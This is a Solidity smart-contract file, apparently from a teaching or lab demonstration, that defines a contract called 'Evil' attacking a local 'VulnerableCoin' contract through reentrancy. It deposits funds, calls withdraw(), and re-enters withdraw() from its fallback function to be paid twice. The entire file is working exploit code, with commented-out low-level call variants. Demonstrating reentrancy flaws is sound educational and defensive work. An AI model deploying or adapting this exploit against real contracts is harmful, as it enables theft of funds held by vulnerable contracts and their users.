pragma solidity ^0.4.15;

import "./VulnerableCoin.sol";

contract Evil {
    event Log(
        string theContract,
        string theFunction,
        string message,
        uint256 value
    );
    // The attacker would use the address of the vulnerable contract
    // We'll use the abi since we control both contracts
//    address targetContract;
    VulnerableCoin public targetContract;
    uint times;

    function Evil(address vulnerableCoin) {
//        targetContract = vulnerableCoin;
        targetContract = VulnerableCoin(vulnerableCoin);
    }

    function enter(uint256 amount) payable {
        require(this.balance >= amount);
//        targetContract.call.value(amount - gas)(bytes4(sha3("buy()")));
        targetContract.buy.value(amount)();
    }

    function exit() external {
        Log("Evil", "exit", "enter exit", this.balance);
//        targetContract.call(bytes4(sha3("withdraw()")));
        targetContract.withdraw();
    }

    function () payable {
        if (times == 0) {
            times++;
            Log("Evil", "fallback", "We have been payed once and we are about to be payed again", this.balance);
//            targetContract.call(bytes4(sha3("withdraw()")));
            targetContract.withdraw();
            Log("Evil", "fallback", "We exit default, balance is", this.balance);
        }
    }
}
